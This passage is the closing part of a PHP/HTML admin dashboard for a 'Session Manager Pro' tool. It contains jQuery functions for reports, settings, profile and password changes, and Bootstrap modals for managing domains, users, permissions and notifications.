                    loadNotificationCount();
                } else showToast(r.error || 'Failed to send notification', 'error');
            })
            .fail(() => showToast('Failed to send notification', 'error'));
    }

    function markNotificationRead(id) {
        $.post('/admin/api/markNotificationRead.php', { id: id })
            .done(() => {
                loadNotifications();
                loadNotificationCount();
            });
    }

    // ============================================
    // REPORTS
    // ============================================
    function loadReports() {
        $('#pageContent').html(`
            <div class="row">
                <div class="col-md-6"><div class="card"><div class="card-header">Export Reports</div><div class="card-body">
                    <button class="btn btn-primary w-100 mb-2" onclick="exportReport('sessions')"><i class="fas fa-database"></i> Export Sessions (JSON)</button>
                    <button class="btn btn-success w-100 mb-2" onclick="exportReport('users')"><i class="fas fa-users"></i> Export Users (CSV)</button>
                    <button class="btn btn-info w-100 mb-2" onclick="exportReport('activity')"><i class="fas fa-history"></i> Export Activity Log (CSV)</button>
                    <button class="btn btn-warning w-100" onclick="exportReport('domains')"><i class="fas fa-globe"></i> Export Domains (PDF)</button>
                </div></div></div>
                <div class="col-md-6"><div class="card"><div class="card-header">Scheduled Reports</div><div class="card-body">
                    <div class="mb-3"><label>Report Type</label><select class="form-select" id="reportType"><option>Daily Summary</option><option>Weekly Report</option><option>Monthly Analytics</option></select></div>
                    <div class="mb-3"><label>Recipients</label><input type="email" class="form-control" placeholder="email@example.com" id="reportEmail"></div>
                    <button class="btn btn-primary w-100" onclick="scheduleReport()">Schedule Report</button>
                </div></div></div>
            </div>
        `);
    }

    function exportReport(type) {
        window.location.href = `/exportReport.php?type=${type}`;
        showToast('Export started', 'success');
    }

    function scheduleReport() {
        showToast('Report scheduled', 'success');
    }

    // ============================================
    // SETTINGS
    // ============================================
    function loadSettings() {
        $('#pageContent').html(`
            <div class="row">
                <div class="col-md-6"><div class="card"><div class="card-header">General Settings</div><div class="card-body">
                    <div class="mb-3"><label>Site Name</label><input type="text" class="form-control" id="siteName" value="Session Manager Pro"></div>
                    <div class="mb-3"><label>Session Timeout (seconds)</label><input type="number" class="form-control" id="sessionTimeout" value="3600"></div>
                    <div class="mb-3"><label>Auto-Refresh Interval (ms)</label><input type="number" class="form-control" id="refreshInterval" value="30000"></div>
                    <div class="mb-3"><div class="form-check"><input type="checkbox" class="form-check-input" id="enableNotifications" checked> Enable Notifications</div></div>
                    <button class="btn btn-primary" onclick="saveSettings()">Save Settings</button>
                </div></div></div>
                <div class="col-md-6"><div class="card"><div class="card-header">Maintenance</div><div class="card-body">
                    <button class="btn btn-warning w-100 mb-2" onclick="clearCache()"><i class="fas fa-trash"></i> Clear Cache</button>
                    <button class="btn btn-danger w-100" onclick="enterMaintenanceMode()"><i class="fas fa-tools"></i> Maintenance Mode</button>
                </div></div></div>
            </div>
        `);
    }

    function saveSettings() {
        showToast('Settings saved', 'success');
    }

    function clearCache() {
        showToast('Cache cleared', 'success');
    }

    function enterMaintenanceMode() {
        if (confirm('Enter maintenance mode? Users will be locked out.')) {
            showToast('Maintenance mode enabled', 'warning');
        }
    }

    // ============================================
    // PROFILE
    // ============================================
    function loadProfile() {
        $('#pageContent').html(`
            <div class="card"><div class="card-header">My Profile</div><div class="card-body">
                <div class="row"><div class="col-md-6"><label>Username</label><input type="text" class="form-control" value="<?php echo htmlspecialchars($currentUser['username']); ?>" readonly></div>
                <div class="col-md-6"><label>Email</label><input type="email" class="form-control" id="profileEmail" value="<?php echo htmlspecialchars($currentUser['email']); ?>"></div>
                <div class="col-md-12 mt-3"><label>Full Name</label><input type="text" class="form-control" id="profileFullName" value="<?php echo htmlspecialchars($currentUser['full_name']); ?>"></div>
                <div class="col-md-12 mt-3"><button class="btn btn-primary" onclick="updateProfile()">Update Profile</button></div>
            </div></div></div>
        `);
    }

    function updateProfile() {
        showToast('Profile updated', 'success');
    }

    function changePassword() {
        document.getElementById('currentPassword').value = '';
        document.getElementById('newPassword').value = '';
        document.getElementById('confirmPassword').value = '';
        new bootstrap.Modal(document.getElementById('passwordModal')).show();
    }

    function updatePassword() {
        const current = document.getElementById('currentPassword').value;
        const newPass = document.getElementById('newPassword').value;
        const confirm = document.getElementById('confirmPassword').value;
        
        if (newPass !== confirm) {
            showToast('Passwords do not match', 'error');
            return;
        }
        if (newPass.length < 8) {
            showToast('Password must be at least 8 characters', 'error');
            return;
        }
        
        $.post('/admin/api/changePassword.php', { current: current, new: newPass })
            .done(function(r) {
                if (r.success) {
                    showToast('Password changed successfully', 'success');
                    bootstrap.Modal.getInstance(document.getElementById('passwordModal')).hide();
                } else showToast(r.error || 'Failed to change password', 'error');
            })
            .fail(() => showToast('Failed to change password', 'error'));
    }

    function loadNotificationCount() {
        fetch('/admin/api/getNotificationCount.php')
            .then(r => r.json())
            .then(data => {
                $('#notificationCount').text(data.count || 0);
            })
            .catch(() => console.log('Failed to load notification count'));
    }

    function escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    $(document).ready(function() {
        $('.menu-item').click(function() { loadPage($(this).data('page')); });
        loadPage('dashboard');
        loadNotificationCount();
        setInterval(loadNotificationCount, 30000);
    });

    // Global functions
    window.loadPage = loadPage;
    window.showDomainModal = showDomainModal;
    window.saveDomain = saveDomain;
    window.editDomain = editDomain;
    window.deleteDomain = deleteDomain;
    window.showUserModal = showUserModal;
    window.createUser = createUser;
    window.editUser = editUser;
    window.saveEditUser = saveEditUser;
    window.managePermissions = managePermissions;
    window.addPermission = addPermission;
    window.removePermission = removePermission;
    window.deleteUser = deleteUser;
    window.sendNotification = sendNotification;
    window.markNotificationRead = markNotificationRead;
    window.exportReport = exportReport;
    window.scheduleReport = scheduleReport;
    window.saveSettings = saveSettings;
    window.clearCache = clearCache;
    window.enterMaintenanceMode = enterMaintenanceMode;
    window.updateProfile = updateProfile;
    window.changePassword = changePassword;
    window.updatePassword = updatePassword;
    window.showNotificationModal = showNotificationModal;
    </script>

    <!-- Domain Modal (Add / Edit) -->
    <div class="modal fade" id="domainModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="domainModalLabel"><i class="fas fa-globe"></i> Add Domain</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <input type="hidden" id="domainId">
                    <div class="mb-3">
                        <label class="form-label">Domain Name <span class="text-danger">*</span></label>
                        <input type="text" id="domainName" class="form-control" placeholder="e.g. example.com">
                        <small class="text-muted">Enter the main domain (e.g. example.com). Subdomains like sub.example.com are covered automatically if Wildcard is checked.</small>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Description</label>
                        <textarea id="domainDescription" class="form-control" rows="2" placeholder="Optional description"></textarea>
                    </div>
                    <div class="mb-3 form-check">
                        <input type="checkbox" id="isWildcard" class="form-check-input">
                        <label class="form-check-label" for="isWildcard">Wildcard — includes all subdomains automatically</label>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Status</label>
                        <select id="domainStatus" class="form-select">
                            <option value="active">Active</option>
                            <option value="inactive">Inactive</option>
                            <option value="suspended">Suspended</option>
                        </select>
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button class="btn btn-primary" onclick="saveDomain()"><i class="fas fa-save"></i> Save Domain</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Add User Modal -->
    <div class="modal fade" id="userModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-user-plus"></i> Add New User</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Username <span class="text-danger">*</span></label>
                        <input type="text" id="userUsername" class="form-control" placeholder="Username" autocomplete="off">
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Password <span class="text-danger">*</span></label>
                        <input type="password" id="userPassword" class="form-control" placeholder="Password" autocomplete="new-password">
                    </div>
                    <div class="row g-3 mb-3">
                        <div class="col-md-6">
                            <label class="form-label">Email</label>
                            <input type="email" id="userEmail" class="form-control" placeholder="Email">
                        </div>
                        <div class="col-md-6">
                            <label class="form-label">Full Name</label>
                            <input type="text" id="userFullName" class="form-control" placeholder="Full Name">
                        </div>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Role</label>
                        <select id="userRole" class="form-select">
                            <option value="viewer">Viewer — can only view assigned domains</option>
                            <option value="domain_admin">Domain Admin — manages one domain + its subdomains</option>
                            <option value="admin">Admin — manages all domains</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Assigned Domain</label>
                        <select id="userAssignedDomain" class="form-select">
                            <option value="">None (global access)</option>
                        </select>
                        <small class="text-muted">For Domain Admin: the user will see sessions only for this domain and its subdomains.</small>
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button class="btn btn-primary" onclick="createUser()"><i class="fas fa-user-plus"></i> Create User</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Edit User Modal -->
    <div class="modal fade" id="editUserModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-user-edit"></i> Edit User: <span id="editUsernameDisplay"></span></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <input type="hidden" id="editUserId">
                    <div class="row g-3 mb-3">
                        <div class="col-md-6">
                            <label class="form-label">Email</label>
                            <input type="email" id="editEmail" class="form-control">
                        </div>
                        <div class="col-md-6">
                            <label class="form-label">Full Name</label>
                            <input type="text" id="editFullName" class="form-control">
                        </div>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Role</label>
                        <select id="editRole" class="form-select">
                            <option value="viewer">Viewer</option>
                            <option value="domain_admin">Domain Admin</option>
                            <option value="admin">Admin</option>
                            <option value="super_admin">Super Admin</option>
                        </select>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Assigned Domain</label>
                        <select id="editAssignedDomain" class="form-select">
                            <option value="">None (global access)</option>
                        </select>
                        <small class="text-muted">Domain Admin users will only see sessions for this domain and its subdomains.</small>
                    </div>
                    <div class="mb-3 form-check">
                        <input type="checkbox" id="editIsActive" class="form-check-input">
                        <label class="form-check-label" for="editIsActive">Account Active</label>
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button class="btn btn-primary" onclick="saveEditUser()"><i class="fas fa-save"></i> Save Changes</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Permissions Modal -->
    <div class="modal fade" id="permissionsModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-key"></i> Permissions for: <span id="permUsername"></span></h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <input type="hidden" id="permUserId">
                    <h6 class="mb-3">Current Permissions</h6>
                    <table class="table table-sm mb-4">
                        <thead><tr><th>Domain</th><th>View</th><th>Edit</th><th>Delete</th><th>Commands</th><th></th></tr></thead>
                        <tbody id="currentPermissionsTable"><tr><td colspan="6" class="text-center text-muted">Loading…</td></tr></tbody>
                    </table>
                    <hr>
                    <h6 class="mb-3">Add / Update Permission</h6>
                    <div class="mb-3">
                        <label class="form-label">Domain</label>
                        <select id="permDomainId" class="form-select">
                            <option value="">Select domain…</option>
                        </select>
                    </div>
                    <div class="d-flex gap-4 mb-3">
                        <div class="form-check"><input type="checkbox" id="permCanView" class="form-check-input" checked><label class="form-check-label" for="permCanView">View</label></div>
                        <div class="form-check"><input type="checkbox" id="permCanEdit" class="form-check-input"><label class="form-check-label" for="permCanEdit">Edit</label></div>
                        <div class="form-check"><input type="checkbox" id="permCanDelete" class="form-check-input"><label class="form-check-label" for="permCanDelete">Delete</label></div>
                        <div class="form-check"><input type="checkbox" id="permCanCmd" class="form-check-input"><label class="form-check-label" for="permCanCmd">Send Commands</label></div>
                    </div>
                    <button class="btn btn-primary" onclick="addPermission()"><i class="fas fa-plus"></i> Add Permission</button>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Notification Modal -->
    <div class="modal fade" id="notificationModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-bell"></i> Send Notification</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Recipient</label>
                        <select id="notifUserId" class="form-select"><option value="all">All Users</option></select>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Title <span class="text-danger">*</span></label>
                        <input type="text" id="notifTitle" class="form-control" placeholder="Notification title">
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Message <span class="text-danger">*</span></label>
                        <textarea id="notifMessage" class="form-control" rows="3" placeholder="Notification message"></textarea>
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Type</label>
                        <select id="notifType" class="form-select">
                            <option value="info">Info</option>
                            <option value="success">Success</option>
                            <option value="warning">Warning</option>
                            <option value="danger">Danger</option>
                        </select>
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button class="btn btn-primary" onclick="sendNotification()"><i class="fas fa-paper-plane"></i> Send</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Password Modal -->
    <div class="modal fade" id="passwordModal" tabindex="-1">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-key"></i> Change Password</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <div class="modal-body">
                    <div class="mb-3">
                        <label class="form-label">Current Password</label>
                        <input type="password" id="currentPassword" class="form-control" autocomplete="current-password">
                    </div>
                    <div class="mb-3">
                        <label class="form-label">New Password</label>
                        <input type="password" id="newPassword" class="form-control" autocomplete="new-password">
                    </div>
                    <div class="mb-3">
                        <label class="form-label">Confirm New Password</label>
                        <input type="password" id="confirmPassword" class="form-control" autocomplete="new-password">
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button class="btn btn-primary" onclick="updatePassword()"><i class="fas fa-save"></i> Update Password</button>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>